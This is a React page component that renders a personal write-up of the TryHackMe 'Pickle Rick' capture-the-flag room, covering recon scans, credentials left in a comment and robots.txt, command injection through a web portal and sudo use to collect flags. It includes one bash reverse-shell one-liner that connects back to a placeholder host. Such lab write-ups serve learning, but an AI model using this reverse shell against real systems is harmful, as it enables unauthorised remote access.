import { ThemeToggle } from "@/components/ThemeToggle"
import { StarBackground } from '@/components/StarBackground';
import { Footer } from '@/components/Footer'
import { Navbar } from "@/components/Navbar";

export const Writeup1 = () => {
    return (<div className="min-h-screen bg-background text-foreground overflow-x-hidden">

        {/* Theme Toggle */}
            <ThemeToggle />
        {/* Background Effects */}
            <StarBackground />

            <Navbar />
            
        {/* Writeups */}
        <div id="writeup1" className="relative min-h-screen px-4">
            <div id="hero" className="container max-w-6xl mx-auto z-10">
                <h1 className="text-4xl md:text-6xl pt-50 pb-10 font-bold tracking-tight">
                    Pickle Rick
                </h1>
                
                <p className="text-left text-muted-foreground p-4">
                    This is my first writeup that I will be logging, however I have completed many CTFs without writeups in the past.
                    This one was fairly simple, and a good warmup. I completed this by running Kali Linux on a VM with a VPN tunnel to
                    TryHackMe's machine.
                </p>
                    
                <h1 className="text-2xl md:text-4xl pt-10 font-semibold tracking-tight">
                    Reconnaissance
                </h1>
                
                <p className="text-left text-muted-foreground p-4">
                    I first ran nikto, gobuster, ajurn and nmap, then briefly inspected the index page for anything interesting while
                    waiting for the scans to complete.
                </p>

                <img src='/assets/writeup1/writeup1-1.png' alt='img1' />

                <p className="text-left text-muted-foreground p-4">
                    A comment conveniently revealing Rick's username. Gobuster gave promising results, revealing some directories.
                </p>

                <img
                    src='/assets/writeup1/writeup1-2.png'
                    alt='img2'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    The robots file revealed a string that was probably Rick's password. The next step was to look for a login page.
                    Nikto's scan showed a php file named login, so directing to that was the login page.
                </p>

                <img
                    src='/assets/writeup1/writeup1-3.png'
                    alt='img3'
                    className="mx-auto pb-3.5"
                />
                <img
                    src='/assets/writeup1/writeup1-4.png'
                    alt='img4'
                    className="mx-auto"
                />
                
                <img
                    src='/assets/writeup1/writeup1-4.png'
                    alt='img4'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    Using the credentials found earlier, we're taken to a “portal”.
                </p>

                <img
                    src='/assets/writeup1/writeup1-5.png'
                    alt='img5'
                    className="mx-auto"
                />

                <h1 className="text-2xl md:text-4xl p-10 font-semibold tracking-tight">
                    Exploitation: Command Injection
                </h1>

                <img
                    src='/assets/writeup1/writeup1-6.png'
                    alt='img6'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    We are in the /var/www/html path and the user is www-data. Root access works here as I <code className="code-font">sudo ls -la</code>'d,
                    so this made it easier. I found the first flag in a text file, but directly reading it from the page won't work, so I typed it into the
                    URL. Reading the clue file told me to explore the directories. Since running executables won't work here, I figured I could use a reverse shell.
                </p>

                <h1 className="text-2xl md:text-4xl p-10 font-semibold tracking-tight">
                    Reverse Shell
                </h1>

                <p className="text-left text-muted-foreground p-4">
                    Running netcat on a separate terminal on port 8080, I tried a combination of reverse shell payload one liners, ranging from bash, python, perl,
                    netcat. I ended up with running a bash command that runs the payload on a new instance of bash:
                </p>
                <p className="text-muted-foreground p-4">
                    <code className="code-font">bash -c 'bash -i {'>'}& /dev/tcp/x.x.x.x/8080 0{'>'}&1'</code>
                </p>
                <p className="text-left text-muted-foreground p-4">
                    Which I can then remotely access the machine through Kali.
                </p>

                <img
                    src='/assets/writeup1/writeup1-7.png'
                    alt='img7'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    I then found the second flag in the home folder and the last one in the root folder, which I already found out that I could use sudo commands.
                </p>

                <img
                    src='/assets/writeup1/writeup1-8.png'
                    alt='img8'
                    className="mx-auto pb-3.5"
                />
                <img
                    src='/assets/writeup1/writeup1-9.png'
                    alt='img9'
                    className="mx-auto"
                />

                <p className="text-left text-muted-foreground p-4">
                    This whole process took around 50 minutes including the time taken to do the scans. Thank you for reading!
                </p>

            </div>
        </div>

        {/* Footer */}
            <Footer />
    </div>)
}